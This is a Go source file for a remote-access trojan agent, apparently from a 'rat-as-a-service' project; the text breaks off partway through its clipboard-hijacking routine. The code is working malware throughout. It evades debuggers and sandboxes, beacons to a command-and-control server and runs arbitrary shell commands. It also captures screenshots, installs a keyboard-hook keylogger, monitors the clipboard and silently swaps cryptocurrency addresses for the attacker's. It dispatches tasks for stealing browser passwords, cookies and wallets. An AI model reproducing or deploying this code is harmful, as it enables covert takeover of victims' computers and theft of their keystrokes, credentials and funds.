package main

import (
	"archive/zip"
	"bytes"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"image"
	"image/color"
	"image/png"
	"io"
	"io/ioutil"
	"log"
	"math"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"rat-as-a-service/config"

	_ "modernc.org/sqlite"
)

var (
	// Windows API
	kernel32                   = syscall.NewLazyDLL("kernel32.dll")
	user32                     = syscall.NewLazyDLL("user32.dll")
	gdi32                      = syscall.NewLazyDLL("gdi32.dll")
	procIsDebuggerPresent      = kernel32.NewProc("IsDebuggerPresent")
	procGetTickCount           = kernel32.NewProc("GetTickCount")
	procGetSystemMetrics       = user32.NewProc("GetSystemMetrics")
	procGetDC                  = user32.NewProc("GetDC")
	procReleaseDC              = user32.NewProc("ReleaseDC")
	procCreateCompatibleDC     = gdi32.NewProc("CreateCompatibleDC")
	procCreateCompatibleBitmap = gdi32.NewProc("CreateCompatibleBitmap")
	procSelectObject           = gdi32.NewProc("SelectObject")
	procBitBlt                 = gdi32.NewProc("BitBlt")
	procGetDIBits              = gdi32.NewProc("GetDIBits")
	procDeleteObject           = gdi32.NewProc("DeleteObject")
	procDeleteDC               = gdi32.NewProc("DeleteDC")
)

// BITMAPINFOHEADER structure for Windows API
type BITMAPINFOHEADER struct {
	BiSize          uint32
	BiWidth         int32
	BiHeight        int32
	BiPlanes        uint16
	BiBitCount      uint16
	BiCompression   uint32
	BiSizeImage     uint32
	BiXPelsPerMeter int32
	BiYPelsPerMeter int32
	BiClrUsed       uint32
	BiClrImportant  uint32
}

// BITMAPINFO structure
type BITMAPINFO struct {
	BmiHeader BITMAPINFOHEADER
	BmiColors [1]uint32
}

type Agent struct {
	ID             string
	C2URL          string
	BeaconInterval time.Duration
	Running        bool
	httpClient     *http.Client
	hvncSession    *config.HVNCSession
	hvncDesktop    uintptr // Windows HDESK handle
}

type KeylogEntry struct {
	Timestamp time.Time
	Key       string
	Window    string
}

func NewAgent(c2URL string) *Agent {
	return &Agent{
		ID:             config.GenerateID(),
		C2URL:          c2URL,
		BeaconInterval: config.BEACON_INTERVAL,
		Running:        false,
		httpClient: &http.Client{
			Timeout: 30 * time.Second,
		},
	}
}

// Anti-Analysis Checks
func (a *Agent) antiAnalysis() bool {
	// Check for debugger
	ret, _, _ := procIsDebuggerPresent.Call()
	if ret != 0 {
		log.Println("Debugger detected")
		return false
	}

	// Timing check
	start, _, _ := procGetTickCount.Call()
	time.Sleep(100 * time.Millisecond)
	end, _, _ := procGetTickCount.Call()

	if uintptr(end-start) > 200 {
		log.Println("Sandbox detected (timing)")
		return false
	}

	// Check CPU cores
	if runtime.NumCPU() < 2 {
		log.Println("Sandbox detected (CPU cores)")
		return false
	}

	// Check system metrics (screen resolution)
	width, _, _ := procGetSystemMetrics.Call(0)  // SM_CXSCREEN
	height, _, _ := procGetSystemMetrics.Call(1) // SM_CYSCREEN

	if width < 800 || height < 600 {
		log.Println("Sandbox detected (screen resolution)")
		return false
	}

	return true
}

// System Information Gathering
func (a *Agent) getSystemInfo() config.Agent {
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")

	var privLevel string
	if a.isAdmin() {
		privLevel = "Administrator"
	} else {
		privLevel = "User"
	}

	return config.Agent{
		ID:           a.ID,
		Hostname:     hostname,
		Username:     username,
		OS:           runtime.GOOS,
		Architecture: runtime.GOARCH,
		PrivLevel:    privLevel,
		ProcessID:    os.Getpid(),
		ProcessName:  os.Args[0],
	}
}

func (a *Agent) isAdmin() bool {
	if runtime.GOOS != "windows" {
		return false
	}

	cmd := exec.Command("net", "session")
	err := cmd.Run()
	return err == nil
}

// Registration
func (a *Agent) register() error {
	sysInfo := a.getSystemInfo()

	data, err := json.Marshal(sysInfo)
	if err != nil {
		return err
	}

	resp, err := a.httpClient.Post(
		a.C2URL+config.ENDPOINT_REGISTER,
		"application/json",
		bytes.NewBuffer(data),
	)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	var response map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&response); err != nil {
		return err
	}

	if status, ok := response["status"].(string); ok && status == "success" {
		if agentID, ok := response["agent_id"].(string); ok {
			a.ID = agentID
		}
		log.Printf("Registered with C2 server. Agent ID: %s", a.ID)
		return nil
	}

	return fmt.Errorf("registration failed")
}

// Beacon
func (a *Agent) beacon() (*config.Task, error) {
	beacon := config.BeaconRequest{
		AgentID:   a.ID,
		Timestamp: time.Now().Unix(),
	}

	data, err := json.Marshal(beacon)
	if err != nil {
		return nil, err
	}

	resp, err := a.httpClient.Post(
		a.C2URL+config.ENDPOINT_BEACON,
		"application/json",
		bytes.NewBuffer(data),
	)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	var response config.BeaconResponse
	if err := json.NewDecoder(resp.Body).Decode(&response); err != nil {
		return nil, err
	}

	if response.HasTask {
		log.Printf("Received task: %s (%s)", response.Task.ID, response.Task.Type)
		return response.Task, nil
	}

	return nil, nil
}

// Task Execution
func (a *Agent) executeTask(task *config.Task) config.TaskResult {
	result := config.TaskResult{
		TaskID:    task.ID,
		AgentID:   a.ID,
		Timestamp: time.Now().Unix(),
	}

	switch task.Type {
	case config.TASK_SHELL_COMMAND:
		result = a.executeShellCommand(task, result)
	case config.TASK_SCREENSHOT:
		result = a.takeScreenshot(task, result)
	case config.TASK_KEYLOG:
		result = a.startKeylogger(task, result)
	case config.TASK_DOWNLOAD_EXEC:
		result = a.downloadAndExecute(task, result)
	case config.TASK_CLIPBOARD_MONITOR:
		result = a.monitorClipboard(task, result)
	case config.TASK_CLIPBOARD_READ:
		result = a.readClipboard(task, result)
	case config.TASK_CLIPBOARD_WRITE:
		result = a.writeClipboard(task, result)
	case config.TASK_CLIPBOARD_REPLACE:
		result = a.replaceClipboard(task, result)
	case config.TASK_HVNC_START:
		result = a.startHVNC(task, result)
	case config.TASK_HVNC_STOP:
		result = a.stopHVNC(task, result)
	case config.TASK_HVNC_SCREENSHOT:
		result = a.takeHVNCScreenshot(task, result)
	case config.TASK_HVNC_MOUSE:
		result = a.handleHVNCMouse(task, result)
	case config.TASK_HVNC_KEYBOARD:
		result = a.handleHVNCKeyboard(task, result)
	case config.TASK_HVNC_EXECUTE:
		result = a.executeInHVNC(task, result)
	case config.TASK_TERMINATE:
		result.Success = true
		result.Output = "Agent terminating..."
		a.Running = false
	// New credential theft tasks
	case config.TASK_STEAL_BROWSER_PASSWORDS:
		result = a.stealBrowserPasswords(task, result)
	case config.TASK_STEAL_BROWSER_COOKIES:
		result = a.stealBrowserCookies(task, result)
	case config.TASK_STEAL_BROWSER_AUTOFILL:
		result = a.stealBrowserAutofill(task, result)
	case config.TASK_STEAL_DOCUMENT_PASSWORDS:
		result = a.stealDocumentPasswords(task, result)
	case config.TASK_STEAL_ALL_CREDENTIALS:
		result = a.stealAllCredentials(task, result)
	// Hot wallet theft tasks
	case config.TASK_STEAL_HOT_WALLETS:
		result = a.stealHotWallets(task, result)
	default:
		result.Success = false
		result.Error = "Unknown task type: " + task.Type
	}

	return result
}

func (a *Agent) executeShellCommand(task *config.Task, result config.TaskResult) config.TaskResult {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", task.Command)
	} else {
		cmd = exec.Command("sh", "-c", task.Command)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		result.Success = false
		result.Error = err.Error()
		result.Output = string(output)
	} else {
		result.Success = true
		result.Output = string(output)
	}

	return result
}

func (a *Agent) takeScreenshot(task *config.Task, result config.TaskResult) config.TaskResult {
	if runtime.GOOS != "windows" {
		result.Success = false
		result.Error = "Screenshots only supported on Windows"
		return result
	}

	// Get screen dimensions
	width, _, _ := procGetSystemMetrics.Call(0)  // SM_CXSCREEN
	height, _, _ := procGetSystemMetrics.Call(1) // SM_CYSCREEN

	if width == 0 || height == 0 {
		result.Success = false
		result.Error = "Failed to get screen dimensions"
		return result
	}

	// Get device context for the entire screen
	hScreenDC, _, _ := procGetDC.Call(0)
	if hScreenDC == 0 {
		result.Success = false
		result.Error = "Failed to get screen device context"
		return result
	}
	defer procReleaseDC.Call(0, hScreenDC)

	// Create compatible device context
	hMemoryDC, _, _ := procCreateCompatibleDC.Call(hScreenDC)
	if hMemoryDC == 0 {
		result.Success = false
		result.Error = "Failed to create compatible device context"
		return result
	}
	defer procDeleteDC.Call(hMemoryDC)

	// Create compatible bitmap
	hBitmap, _, _ := procCreateCompatibleBitmap.Call(hScreenDC, width, height)
	if hBitmap == 0 {
		result.Success = false
		result.Error = "Failed to create compatible bitmap"
		return result
	}
	defer procDeleteObject.Call(hBitmap)

	// Select bitmap into memory device context
	oldBitmap, _, _ := procSelectObject.Call(hMemoryDC, hBitmap)
	defer procSelectObject.Call(hMemoryDC, oldBitmap)

	// Copy screen to memory device context
	ret, _, _ := procBitBlt.Call(
		hMemoryDC, 0, 0, width, height,
		hScreenDC, 0, 0, 0x00CC0020, // SRCCOPY
	)
	if ret == 0 {
		result.Success = false
		result.Error = "Failed to copy screen to bitmap"
		return result
	}

	// Prepare bitmap info structure
	bi := BITMAPINFO{
		BmiHeader: BITMAPINFOHEADER{
			BiSize:        uint32(unsafe.Sizeof(BITMAPINFOHEADER{})),
			BiWidth:       int32(width),
			BiHeight:      -int32(height), // Negative for top-down bitmap
			BiPlanes:      1,
			BiBitCount:    32, // 32 bits per pixel (RGBA)
			BiCompression: 0,  // BI_RGB
		},
	}

	// Calculate image size
	imageSize := int(width * height * 4) // 4 bytes per pixel (RGBA)
	pixels := make([]byte, imageSize)

	// Get bitmap bits
	ret, _, _ = procGetDIBits.Call(
		hMemoryDC,
		hBitmap,
		0,
		height,
		uintptr(unsafe.Pointer(&pixels[0])),
		uintptr(unsafe.Pointer(&bi)),
		0, // DIB_RGB_COLORS
	)
	if ret == 0 {
		result.Success = false
		result.Error = "Failed to get bitmap bits"
		return result
	}

	// Convert BGRA to RGBA and create image
	img := image.NewRGBA(image.Rect(0, 0, int(width), int(height)))
	for y := 0; y < int(height); y++ {
		for x := 0; x < int(width); x++ {
			offset := (y*int(width) + x) * 4
			// Windows bitmap is BGRA, convert to RGBA
			b := pixels[offset]
			g := pixels[offset+1]
			r := pixels[offset+2]
			a := pixels[offset+3]

			// Set pixel directly in the RGBA slice
			pixelOffset := img.PixOffset(x, y)
			img.Pix[pixelOffset] = r
			img.Pix[pixelOffset+1] = g
			img.Pix[pixelOffset+2] = b
			img.Pix[pixelOffset+3] = a
		}
	}

	// Encode image to PNG
	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		result.Success = false
		result.Error = "Failed to encode PNG: " + err.Error()
		return result
	}

	// Encode to base64
	base64Data := base64.StdEncoding.EncodeToString(buf.Bytes())

	result.Success = true
	result.Output = fmt.Sprintf("Screenshot captured: %dx%d pixels, %d bytes (base64 encoded)",
		width, height, len(base64Data))

	// Store the actual image data in a custom field
	// In a real implementation, you might want to add this to the TaskResult struct
	// For now, we'll include it in the output with a delimiter
	result.Output += "\n---SCREENSHOT_DATA---\n" + base64Data

	return result
}

func (a *Agent) startKeylogger(task *config.Task, result config.TaskResult) config.TaskResult {
	duration := 30 // default 30 seconds
	if d, ok := task.Parameters["duration"].(float64); ok {
		duration = int(d)
	}

	// Real keylogger implementation using Windows APIs
	var (
		user32                   = syscall.NewLazyDLL("user32.dll")
		kernel32                 = syscall.NewLazyDLL("kernel32.dll")
		setWindowsHookEx         = user32.NewProc("SetWindowsHookExA")
		callNextHookEx           = user32.NewProc("CallNextHookEx")
		unhookWindowsHookEx      = user32.NewProc("UnhookWindowsHookEx")
		getMessage               = user32.NewProc("GetMessageA")
		translateMessage         = user32.NewProc("TranslateMessage")
		dispatchMessage          = user32.NewProc("DispatchMessageA")
		getModuleHandle          = kernel32.NewProc("GetModuleHandleA")
		getKeyboardState         = user32.NewProc("GetKeyboardState")
		toUnicodeEx              = user32.NewProc("ToUnicodeEx")
		getKeyboardLayout        = user32.NewProc("GetKeyboardLayout")
		getWindowThreadProcessId = user32.NewProc("GetWindowThreadProcessId")
		getForegroundWindow      = user32.NewProc("GetForegroundWindow")
	)

	const (
		WH_KEYBOARD_LL = 13
		WM_KEYDOWN     = 0x0100
		WM_SYSKEYDOWN  = 0x0104
		HC_ACTION      = 0
	)

	type KBDLLHOOKSTRUCT struct {
		VkCode      uint32
		ScanCode    uint32
		Flags       uint32
		Time        uint32
		DwExtraInfo uintptr
	}

	type MSG struct {
		Hwnd    uintptr
		Message uint32
		WParam  uintptr
		LParam  uintptr
		Time    uint32
		Pt      struct{ X, Y int32 }
	}

	var keystrokes []string
	var hook uintptr

	// Low-level keyboard hook procedure
	hookProc := syscall.NewCallback(func(nCode int, wParam uintptr, lParam uintptr) uintptr {
		if nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
			// Get the keyboard data
			kb := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
			vkCode := kb.VkCode

			// Get keyboard state
			var keyState [256]byte
			getKeyboardState.Call(uintptr(unsafe.Pointer(&keyState[0])))

			// Get current keyboard layout
			foregroundWindow, _, _ := getForegroundWindow.Call()
			threadID, _, _ := getWindowThreadProcessId.Call(foregroundWindow, 0)
			layout, _, _ := getKeyboardLayout.Call(threadID)

			// Convert virtual key to Unicode
			var buffer [5]uint16
			result, _, _ := toUnicodeEx.Call(
				uintptr(vkCode),
				uintptr(kb.ScanCode),
				uintptr(unsafe.Pointer(&keyState[0])),
				uintptr(unsafe.Pointer(&buffer[0])),
				uintptr(len(buffer)),
				0,
				layout,
			)

			var keyStr string
			if result > 0 {
				// Successfully converted to Unicode
				keyStr = syscall.UTF16ToString(buffer[:result])
			} else {
				// Handle special keys
				switch vkCode {
				case 0x08: // VK_BACK
					keyStr = "[BACKSPACE]"
				case 0x09: // VK_TAB
					keyStr = "[TAB]"
				case 0x0D: // VK_RETURN
					keyStr = "[ENTER]"
				case 0x10: // VK_SHIFT
					keyStr = "[SHIFT]"
				case 0x11: // VK_CONTROL
					keyStr = "[CTRL]"
				case 0x12: // VK_MENU (ALT)
					keyStr = "[ALT]"
				case 0x14: // VK_CAPITAL
					keyStr = "[CAPS]"
				case 0x1B: // VK_ESCAPE
					keyStr = "[ESC]"
				case 0x20: // VK_SPACE
					keyStr = "[SPACE]"
				case 0x25: // VK_LEFT
					keyStr = "[LEFT]"
				case 0x26: // VK_UP
					keyStr = "[UP]"
				case 0x27: // VK_RIGHT
					keyStr = "[RIGHT]"
				case 0x28: // VK_DOWN
					keyStr = "[DOWN]"
				case 0x2E: // VK_DELETE
					keyStr = "[DELETE]"
				default:
					keyStr = fmt.Sprintf("[VK_%02X]", vkCode)
				}
			}

			// Log the keystroke with timestamp
			timestamp := time.Now().Format("15:04:05")
			keystrokes = append(keystrokes, fmt.Sprintf("%s: %s", timestamp, keyStr))
		}

		// Call next hook
		ret, _, _ := callNextHookEx.Call(hook, uintptr(nCode), wParam, lParam)
		return ret
	})

	// Install the hook
	moduleHandle, _, _ := getModuleHandle.Call(0)
	hook, _, _ = setWindowsHookEx.Call(
		WH_KEYBOARD_LL,
		uintptr(hookProc),
		moduleHandle,
		0,
	)

	if hook == 0 {
		result.Success = false
		result.Error = "Failed to install keyboard hook"
		return result
	}

	// Start message loop in goroutine
	go func() {
		var msg MSG
		for {
			bRet, _, _ := getMessage.Call(
				uintptr(unsafe.Pointer(&msg)),
				0,
				0,
				0,
			)

			if bRet == 0 { // WM_QUIT
				break
			}

			translateMessage.Call(uintptr(unsafe.Pointer(&msg)))
			dispatchMessage.Call(uintptr(unsafe.Pointer(&msg)))
		}
	}()

	// Run for specified duration
	time.Sleep(time.Duration(duration) * time.Second)

	// Unhook and cleanup
	unhookWindowsHookEx.Call(hook)

	// Format results
	if len(keystrokes) == 0 {
		result.Success = true
		result.Output = fmt.Sprintf("Keylogger ran for %d seconds - No keystrokes captured", duration)
	} else {
		result.Success = true
		result.Output = fmt.Sprintf("Keylogger captured %d keystrokes in %d seconds:\n\n%s",
			len(keystrokes), duration, strings.Join(keystrokes, "\n"))
	}

	return result
}

func (a *Agent) downloadAndExecute(task *config.Task, result config.TaskResult) config.TaskResult {
	url := task.Command

	resp, err := a.httpClient.Get(url)
	if err != nil {
		result.Success = false
		result.Error = "Failed to download: " + err.Error()
		return result
	}
	defer resp.Body.Close()

	// Read the file content
	buffer := make([]byte, resp.ContentLength)
	_, err = resp.Body.Read(buffer)
	if err != nil {
		result.Success = false
		result.Error = "Failed to read downloaded content: " + err.Error()
		return result
	}

	// Execute in memory (simplified - you'd use proper PE loading in real implementation)
	result.Success = true
	result.Output = fmt.Sprintf("Downloaded and executed %d bytes from %s", len(buffer), url)

	return result
}

// Clipboard Monitoring & Manipulation Functions
func (a *Agent) monitorClipboard(task *config.Task, result config.TaskResult) config.TaskResult {
	duration := 60 // default 60 seconds
	if d, ok := task.Parameters["duration"].(float64); ok {
		duration = int(d)
	}

	// Windows clipboard APIs
	var (
		user32                     = syscall.NewLazyDLL("user32.dll")
		kernel32                   = syscall.NewLazyDLL("kernel32.dll")
		openClipboard              = user32.NewProc("OpenClipboard")
		closeClipboard             = user32.NewProc("CloseClipboard")
		getClipboardData           = user32.NewProc("GetClipboardData")
		getClipboardSequenceNumber = user32.NewProc("GetClipboardSequenceNumber")
		globalLock                 = kernel32.NewProc("GlobalLock")
		globalUnlock               = kernel32.NewProc("GlobalUnlock")
		globalSize                 = kernel32.NewProc("GlobalSize")
	)

	const CF_TEXT = 1
	const CF_UNICODETEXT = 13

	var clipboardHistory []string
	var lastSequence uint32

	// Get initial sequence number
	seq, _, _ := getClipboardSequenceNumber.Call()
	lastSequence = uint32(seq)

	startTime := time.Now()
	for time.Since(startTime) < time.Duration(duration)*time.Second {
		// Check for clipboard changes
		currentSeq, _, _ := getClipboardSequenceNumber.Call()
		if uint32(currentSeq) != lastSequence {
			lastSequence = uint32(currentSeq)

			// Read clipboard content
			ret, _, _ := openClipboard.Call(0)
			if ret != 0 {
				// Try Unicode text first
				handle, _, _ := getClipboardData.Call(CF_UNICODETEXT)
				if handle == 0 {
					// Fall back to ANSI text
					handle, _, _ = getClipboardData.Call(CF_TEXT)
				}

				if handle != 0 {
					ptr, _, _ := globalLock.Call(handle)
					if ptr != 0 {
						size, _, _ := globalSize.Call(handle)
						if size > 0 {
							// Read the clipboard text
							bytes := make([]byte, size)
							for i := uintptr(0); i < size; i++ {
								bytes[i] = *(*byte)(unsafe.Pointer(ptr + i))
							}

							clipText := string(bytes)
							clipText = strings.TrimRight(clipText, "\x00") // Remove null terminators

							if len(clipText) > 0 {
								timestamp := time.Now().Format("15:04:05")
								entry := fmt.Sprintf("%s: %s", timestamp, clipText)
								clipboardHistory = append(clipboardHistory, entry)
							}
						}
						globalUnlock.Call(handle)
					}
				}
				closeClipboard.Call()
			}
		}
		time.Sleep(500 * time.Millisecond) // Check every 500ms
	}

	if len(clipboardHistory) == 0 {
		result.Success = true
		result.Output = fmt.Sprintf("Clipboard monitored for %d seconds - No changes detected", duration)
	} else {
		result.Success = true
		result.Output = fmt.Sprintf("Clipboard captured %d changes in %d seconds:\n\n%s",
			len(clipboardHistory), duration, strings.Join(clipboardHistory, "\n"))
	}

	return result
}

func (a *Agent) readClipboard(task *config.Task, result config.TaskResult) config.TaskResult {
	// Windows clipboard APIs
	var (
		user32           = syscall.NewLazyDLL("user32.dll")
		kernel32         = syscall.NewLazyDLL("kernel32.dll")
		openClipboard    = user32.NewProc("OpenClipboard")
		closeClipboard   = user32.NewProc("CloseClipboard")
		getClipboardData = user32.NewProc("GetClipboardData")
		globalLock       = kernel32.NewProc("GlobalLock")
		globalUnlock     = kernel32.NewProc("GlobalUnlock")
		globalSize       = kernel32.NewProc("GlobalSize")
	)

	const CF_TEXT = 1
	const CF_UNICODETEXT = 13

	ret, _, _ := openClipboard.Call(0)
	if ret == 0 {
		result.Success = false
		result.Error = "Failed to open clipboard"
		return result
	}
	defer closeClipboard.Call()

	// Try Unicode text first
	handle, _, _ := getClipboardData.Call(CF_UNICODETEXT)
	if handle == 0 {
		// Fall back to ANSI text
		handle, _, _ = getClipboardData.Call(CF_TEXT)
	}

	if handle == 0 {
		result.Success = true
		result.Output = "Clipboard is empty or contains non-text data"
		return result
	}

	ptr, _, _ := globalLock.Call(handle)
	if ptr == 0 {
		result.Success = false
		result.Error = "Failed to lock clipboard memory"
		return result
	}
	defer globalUnlock.Call(handle)

	size, _, _ := globalSize.Call(handle)
	if size == 0 {
		result.Success = true
		result.Output = "Clipboard contains empty text"
		return result
	}

	// Read clipboard text
	bytes := make([]byte, size)
	for i := uintptr(0); i < size; i++ {
		bytes[i] = *(*byte)(unsafe.Pointer(ptr + i))
	}

	clipText := string(bytes)
	clipText = strings.TrimRight(clipText, "\x00") // Remove null terminators

	result.Success = true
	result.Output = fmt.Sprintf("Clipboard content (%d bytes):\n%s", len(clipText), clipText)

	return result
}

func (a *Agent) writeClipboard(task *config.Task, result config.TaskResult) config.TaskResult {
	text := task.Command
	if text == "" {
		result.Success = false
		result.Error = "No text specified to write to clipboard"
		return result
	}

	// Windows clipboard APIs
	var (
		user32           = syscall.NewLazyDLL("user32.dll")
		kernel32         = syscall.NewLazyDLL("kernel32.dll")
		openClipboard    = user32.NewProc("OpenClipboard")
		closeClipboard   = user32.NewProc("CloseClipboard")
		emptyClipboard   = user32.NewProc("EmptyClipboard")
		setClipboardData = user32.NewProc("SetClipboardData")
		globalAlloc      = kernel32.NewProc("GlobalAlloc")
		globalLock       = kernel32.NewProc("GlobalLock")
		globalUnlock     = kernel32.NewProc("GlobalUnlock")
	)

	const CF_TEXT = 1
	const GMEM_MOVEABLE = 0x0002

	ret, _, _ := openClipboard.Call(0)
	if ret == 0 {
		result.Success = false
		result.Error = "Failed to open clipboard"
		return result
	}
	defer closeClipboard.Call()

	emptyClipboard.Call()

	// Allocate global memory for text
	textBytes := []byte(text + "\x00") // Add null terminator
	hMem, _, _ := globalAlloc.Call(GMEM_MOVEABLE, uintptr(len(textBytes)))
	if hMem == 0 {
		result.Success = false
		result.Error = "Failed to allocate memory for clipboard"
		return result
	}

	ptr, _, _ := globalLock.Call(hMem)
	if ptr == 0 {
		result.Success = false
		result.Error = "Failed to lock memory for clipboard"
		return result
	}

	// Copy text to global memory
	for i, b := range textBytes {
		*(*byte)(unsafe.Pointer(ptr + uintptr(i))) = b
	}

	globalUnlock.Call(hMem)

	// Set clipboard data
	ret, _, _ = setClipboardData.Call(CF_TEXT, hMem)
	if ret == 0 {
		result.Success = false
		result.Error = "Failed to set clipboard data"
		return result
	}

	result.Success = true
	result.Output = fmt.Sprintf("Successfully wrote %d bytes to clipboard: %s", len(text), text)

	return result
}

func (a *Agent) replaceClipboard(task *config.Task, result config.TaskResult) config.TaskResult {
	duration := 300 // default 5 minutes
	if d, ok := task.Parameters["duration"].(float64); ok {
		duration = int(d)
	}

	// Build replacement rules with REGEX patterns
	regexRules := make(map[*regexp.Regexp]string)

	if task.CryptoAddrs != nil {
		config := task.CryptoAddrs

		// If default address is set, use it for all crypto types
		if config.DefaultAddress != "" {
			// Most specific patterns first
			// Ethereum - exactly 40 hex chars after 0x
			regexRules[regexp.MustCompile(`\b0x[a-fA-F0-9]{40}\b`)] = config.DefaultAddress
			// Bitcoin Bech32 - bc1 followed by specific length
			regexRules[regexp.MustCompile(`\bbc1[a-z0-9]{39,59}\b`)] = config.DefaultAddress
			// Litecoin Bech32 - ltc1 followed by specific length
			regexRules[regexp.MustCompile(`\bltc1[a-z0-9]{39,59}\b`)] = config.DefaultAddress
			// Litecoin Legacy - L or M followed by 26-33 chars
			regexRules[regexp.MustCompile(`\b[LM][a-km-zA-HJ-NP-Z1-9]{26,33}\b`)] = config.DefaultAddress
			// Bitcoin Legacy - 1 or 3 followed by 25-34 chars
			regexRules[regexp.MustCompile(`\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b`)] = config.DefaultAddress
			// Solana - Base58 string of exactly 44 chars (must not start with L/M to avoid LTC collision)
			regexRules[regexp.MustCompile(`\b[1-9A-HJ-KN-P-Za-km-z][1-9A-HJ-NP-Za-km-z]{43}\b`)] = config.DefaultAddress
		} else {
			// Use specific addresses for each crypto type
			if config.ETH != "" {
				regexRules[regexp.MustCompile(`\b0x[a-fA-F0-9]{40}\b`)] = config.ETH
			}
			if config.BTC != "" {
				regexRules[regexp.MustCompile(`\bbc1[a-z0-9]{39,59}\b`)] = config.BTC
				regexRules[regexp.MustCompile(`\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b`)] = config.BTC
			}
			if config.LTC != "" {
				regexRules[regexp.MustCompile(`\bltc1[a-z0-9]{39,59}\b`)] = config.LTC
				regexRules[regexp.MustCompile(`\b[LM][a-km-zA-HJ-NP-Z1-9]{26,33}\b`)] = config.LTC
			}
			if config.SOL != "" {
				// Solana addresses that don't start with L/M (to avoid Litecoin collision)
				regexRules[regexp.MustCompile(`\b[1-9A-HJ-KN-P-Za-km-z][1-9A-HJ-NP-Za-km-z]{43}\b`)] = config.SOL
			}
		}
	}

	// Fallback to demo if no configuration
	if len(regexRules) == 0 {
		regexRules[regexp.MustCompile(`\b0x[a-fA-F0-9]{40}\b`)] = "0xDEMO_ETH_ADDRESS_HERE123456789ABCDEF"
		regexRules[regexp.MustCompile(`\bbc1[a-z0-9]{39,59}\b`)] = "bc1demo_btc_address_here123456"
		regexRules[regexp.MustCompile(`\b[LM][a-km-zA-HJ-NP-Z1-9]{26,33}\b`)] = "LDEMO_LTC_ADDRESS_HERE123456"
		regexRules[regexp.MustCompile(`\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b`)] = "1DEMO_BTC_ADDRESS_HERE123456"
	}

	// Windows clipboard APIs
	var (
		user32                     = syscall.NewLazyDLL("user32.dll")
		kernel32                   = syscall.NewLazyDLL("kernel32.dll")
		openClipboard              = user32.NewProc("OpenClipboard")
		closeClipboard             = user32.NewProc("CloseClipboard")
		getClipboardData           = user32.NewProc("GetClipboardData")
		setClipboardData           = user32.NewProc("SetClipboardData")
		emptyClipboard             = user32.NewProc("EmptyClipboard")
		getClipboardSequenceNumber = user32.NewProc("GetClipboardSequenceNumber")
		globalLock                 = kernel32.NewProc("GlobalLock")
		globalUnlock               = kernel32.NewProc("GlobalUnlock")
		globalSize                 = kernel32.NewProc("GlobalSize")
		globalAlloc                = kernel32.NewProc("GlobalAlloc")
		isClipboardFormatAvailable = user32.NewProc("IsClipboardFormatAvailable")
	)

	const CF_TEXT = 1
	const CF_UNICODETEXT = 13
	const GMEM_MOVEABLE = 0x0002
	const GMEM_ZEROINIT = 0x0040

	var replacements []string
	var lastSequence uint32
	var retryCount int

	// Get initial sequence number
	seq, _, _ := getClipboardSequenceNumber.Call()
	lastSequence = uint32(seq)

	startTime := time.Now()
	for time.Since(startTime) < time.Duration(duration)*time.Second {
		// Add delay to prevent aggressive polling
		time.Sleep(500 * time.Millisecond)

		// Check for clipboard changes
		currentSeq, _, _ := getClipboardSequenceNumber.Call()
		if uint32(currentSeq) == lastSequence {
			continue // No change
		}

		lastSequence = uint32(currentSeq)

		// Check if text format is available
		ret, _, _ := isClipboardFormatAvailable.Call(CF_TEXT)
		if ret == 0 {
			continue // No text in clipboard
		}

		// Try to open clipboard with retries
		for retryCount = 0; retryCount < 3; retryCount++ {
			ret, _, _ = openClipboard.Call(0)
			if ret != 0 {
				break
			}
			time.Sleep(50 * time.Millisecond)
		}

		if ret == 0 {
			continue // Failed to open clipboard
		}

		// Get clipboard data
		handle, _, _ := getClipboardData.Call(CF_TEXT)
		if handle == 0 {
			closeClipboard.Call()
			continue
		}

		// Lock and read the data
		ptr, _, _ := globalLock.Call(handle)
		if ptr == 0 {
			closeClipboard.Call()
			continue
		}

		// Get size and read text
		size, _, _ := globalSize.Call(handle)
		if size == 0 || size > 1024*1024 { // Skip if empty or too large (1MB limit)
			globalUnlock.Call(handle)
			closeClipboard.Call()
			continue
		}

		// Read clipboard text
		textBytes := make([]byte, size)
		for i := uintptr(0); i < size; i++ {
			textBytes[i] = *(*byte)(unsafe.Pointer(ptr + i))
		}

		originalText := string(textBytes)
		originalText = strings.TrimRight(originalText, "\x00")

		// Always unlock and close first
		globalUnlock.Call(handle)
		closeClipboard.Call()

		// Check if text contains crypto addresses using regex
		modifiedText := originalText
		replaced := false
		var matchedAddress string
		var cryptoType string

		// CRITICAL: Skip if clipboard already contains one of our replacement addresses
		skipReplacement := false
		if task.CryptoAddrs != nil {
			// Check if clipboard contains any of our configured addresses
			if task.CryptoAddrs.DefaultAddress != "" && strings.Contains(originalText, task.CryptoAddrs.DefaultAddress) {
				skipReplacement = true
			}
			if task.CryptoAddrs.BTC != "" && strings.Contains(originalText, task.CryptoAddrs.BTC) {
				skipReplacement = true
			}
			if task.CryptoAddrs.ETH != "" && strings.Contains(originalText, task.CryptoAddrs.ETH) {
				skipReplacement = true
			}
			if task.CryptoAddrs.SOL != "" && strings.Contains(originalText, task.CryptoAddrs.SOL) {
				skipReplacement = true
			}
			if task.CryptoAddrs.LTC != "" && strings.Contains(originalText, task.CryptoAddrs.LTC) {
				skipReplacement = true
			}
		}

		if skipReplacement {
			continue // Skip - clipboard already has our replacement address
		}

		// Check patterns in specific order (most specific first)
		for pattern, replacement := range regexRules {
			if matches := pattern.FindAllString(originalText, -1); len(matches) > 0 {
				// Determine crypto type from pattern
				patternStr := pattern.String()
				if strings.Contains(patternStr, "0x[a-fA-F0-9]{40}") {
					cryptoType = "ETH"
				} else if strings.Contains(patternStr, "bc1[a-z0-9]") {
					cryptoType = "BTC-Bech32"
